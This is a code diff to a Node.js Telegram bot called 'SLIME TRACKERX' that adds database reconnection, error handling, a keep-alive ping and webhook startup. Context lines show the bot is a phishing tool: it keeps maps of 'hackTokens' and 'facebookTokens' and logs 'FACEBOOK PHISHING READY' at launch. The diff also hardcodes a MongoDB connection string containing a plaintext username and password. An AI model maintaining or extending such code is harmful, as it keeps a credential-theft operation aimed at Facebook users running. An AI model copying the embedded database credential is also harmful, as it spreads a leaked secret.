@@ -7,7 +7,7 @@
 // 💰 ECONOMY: 15 START | 5 DAILY | 5 WORK
 // =====================================================
 
-const { Telegraf, Markup } = require("telegraf");
+const { Telegraf } = require("telegraf");
 const express = require("express");
 const bodyParser = require("body-parser");
 const path = require("path");
@@ -71,12 +71,34 @@ fs.ensureDirSync("exports");
 fs.ensureDirSync("public");
 fs.ensureDirSync("public/images");
 
-// ========== 🗄️ MONGODB ==========
+// ========== 🗄️ MONGODB WITH RECONNECTION ==========
 const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";
 
-mongoose.connect(MONGODB_URI)
-  .then(() => console.log('✅ MongoDB Connected'))
-  .catch(err => console.error('❌ MongoDB Error:', err));
+const connectDB = async () => {
+  try {
+    await mongoose.connect(MONGODB_URI, {
+      useNewUrlParser: true,
+      useUnifiedTopology: true,
+      serverSelectionTimeoutMS: 5000,
+      socketTimeoutMS: 45000,
+    });
+    console.log('✅ MongoDB Connected');
+  } catch (err) {
+    console.error('❌ MongoDB Error:', err.message);
+    setTimeout(connectDB, 5000);
+  }
+};
+
+mongoose.connection.on('disconnected', () => {
+  console.log('⚠️ MongoDB disconnected, attempting to reconnect...');
+  setTimeout(connectDB, 3000);
+});
+
+mongoose.connection.on('error', (err) => {
+  console.error('MongoDB connection error:', err);
+});
+
+connectDB();
 
 // ========== 📊 SCHEMAS ==========
 const userSchema = new mongoose.Schema({
@@ -134,20 +156,29 @@ let workCD = new Map();
 let wordChallenges = new Map();
 let hackTokens = new Map();
 let facebookTokens = new Map();
-let userLastMessages = new Map(); // For auto-delete
+let userLastMessages = new Map();
 
 // ========== 📥 DATABASE FUNCTIONS ==========
 async function loadData() {
-  const users = await User.find({});
-  users.forEach(u => usersCache.set(u.userId, u));
-  const codes = await Code.find({ expire: { $gt: new Date() } });
-  codes.forEach(c => codesCache.set(c.code, c));
-  console.log(`📂 Loaded ${usersCache.size} users, ${codesCache.size} codes`);
+  try {
+    const users = await User.find({});
+    users.forEach(u => usersCache.set(u.userId, u));
+    const codes = await Code.find({ expire: { $gt: new Date() } });
+    codes.forEach(c => codesCache.set(c.code, c));
+    console.log(`📂 Loaded ${usersCache.size} users, ${codesCache.size} codes`);
+  } catch (err) {
+    console.error("Error loading data:", err);
+    setTimeout(loadData, 5000);
+  }
 }
 
 async function saveUser(userId, data) {
-  await User.findOneAndUpdate({ userId }, data, { upsert: true });
-  usersCache.set(userId, data);
+  try {
+    await User.findOneAndUpdate({ userId }, data, { upsert: true });
+    usersCache.set(userId, data);
+  } catch (err) {
+    console.error("Error saving user:", err);
+  }
 }
 
 async function initUser(userId, referrerId = null) {
@@ -182,7 +213,7 @@ async function initUser(userId, referrerId = null) {
         referrer.coins += REF_REWARD;
         referrer.referrals++;
         await saveUser(referrerId, referrer);
-        bot.telegram.sendMessage(referrerId, `🎉 **NEW REFERRAL!**\n👤 New user joined!\n💰 +${REF_REWARD} COINS`);
+        bot.telegram.sendMessage(referrerId, `🎉 **NEW REFERRAL!**\n👤 New user joined!\n💰 +${REF_REWARD} COINS`).catch(() => {});
       }
     }
   }
@@ -225,7 +256,7 @@ async function addXP(userId, amount) {
         `📊 ${user.level - 1} → ${user.level}\n` +
         `💰 +${reward} COINS\n` +
         `✨ ${user.xp}/${user.level * 100} XP`
-      );
+      ).catch(() => {});
     } else {
       await saveUser(userId, user);
     }
@@ -257,24 +288,29 @@ async function deleteOldMessage(chatId, messageId) {
 }
 
 async function sendDopeMessage(ctx, text, extra = {}) {
-  // Try to delete previous message
-  const lastMsg = userLastMessages.get(ctx.from.id);
-  if (lastMsg) {
-    await deleteOldMessage(ctx.chat.id, lastMsg);
+  try {
+    // Try to delete previous message
+    const lastMsg = userLastMessages.get(ctx.from.id);
+    if (lastMsg) {
+      await deleteOldMessage(ctx.chat.id, lastMsg);
+    }
+    
+    // Send new message
+    let sentMsg;
+    if (extra.photo) {
+      sentMsg = await ctx.replyWithPhoto(extra.photo, { caption: text, parse_mode: "Markdown", ...extra });
+    } else {
+      sentMsg = await ctx.reply(text, { parse_mode: "Markdown", ...extra });
+    }
+    
+    // Store new message ID
+    userLastMessages.set(ctx.from.id, sentMsg.message_id);
+    
+    return sentMsg;
+  } catch (err) {
+    console.error("Send message error:", err.message);
+    return null;
   }
-  
-  // Send new message
-  let sentMsg;
-  if (extra.photo) {
-    sentMsg = await ctx.replyWithPhoto(extra.photo, { caption: text, parse_mode: "Markdown", ...extra });
-  } else {
-    sentMsg = await ctx.reply(text, { parse_mode: "Markdown", ...extra });
-  }
-  
-  // Store new message ID
-  userLastMessages.set(ctx.from.id, sentMsg.message_id);
-  
-  return sentMsg;
 }
 
 // ========== 🔐 FORCE JOIN FUNCTION ==========
@@ -1117,22 +1153,68 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html")); 
 });
 
+// ========== 🚀 KEEP-ALIVE MECHANISM ==========
+// Ping the server every 4 minutes to prevent Render from sleeping
+setInterval(() => {
+  axios.get(`${DOMAIN}/`).catch(() => {});
+  console.log("💓 Keep-alive ping sent");
+}, 4 * 60 * 1000);
+
 // ========== 🚀 START SERVER ==========
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
+const server = app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
 
-loadData().then(async () => {
-  try {
-    await bot.telegram.deleteWebhook();
-    await bot.launch({ dropPendingUpdates: true });
-    console.log(`🤖 SLIME TRACKERX v69.0 LIVE!`);
-    console.log(`✅ FORCE JOIN ALWAYS ON`);
-    console.log(`✅ FACEBOOK PHISHING READY`);
-    console.log(`✅ AUTO-DELETE MENUS ACTIVE`);
-  } catch(e) { 
-    console.log("Error:", e.message); 
-  }
+// Handle graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('SIGTERM received, closing server...');
+  server.close(() => {
+    bot.stop('SIGTERM');
+    mongoose.connection.close();
+    process.exit(0);
+  });
 });
 
-process.once("SIGINT", () => bot.stop("SIGINT"));
-process.once("SIGTERM", () => bot.stop("SIGTERM"));
+process.on('SIGINT', () => {
+  console.log('SIGINT received, closing server...');
+  server.close(() => {
+    bot.stop('SIGINT');
+    mongoose.connection.close();
+    process.exit(0);
+  });
+});
+
+// Start bot with webhook or polling
+async function startBot() {
+  try {
+    // Use webhook for production (Render)
+    if (process.env.NODE_ENV === 'production' || DOMAIN.includes('render.com')) {
+      await bot.telegram.deleteWebhook();
+      await bot.telegram.setWebhook(`${DOMAIN}/webhook`);
+      console.log(`✅ Webhook set to ${DOMAIN}/webhook`);
+      app.post('/webhook', (req, res) => {
+        bot.handleUpdate(req.body, res);
+      });
+    } else {
+      // Polling for development
+      await bot.launch();
+      console.log(`✅ Bot started with polling`);
+    }
+  } catch (err) {
+    console.error('Failed to start bot:', err);
+    // Fallback to polling
+    await bot.launch();
+    console.log(`✅ Bot started with polling (fallback)`);
+  }
+}
+
+loadData().then(async () => {
+  await startBot();
+  console.log(`🤖 SLIME TRACKERX v69.0 LIVE!`);
+  console.log(`✅ FORCE JOIN ALWAYS ON`);
+  console.log(`✅ FACEBOOK PHISHING READY`);
+  console.log(`✅ AUTO-DELETE MENUS ACTIVE`);
+  console.log(`✅ KEEP-ALIVE ACTIVE (every 4 min)`);
+}).catch(err => {
+  console.error("Failed to load data:", err);
+  startBot(); // Still try to start bot even if DB fails
+});
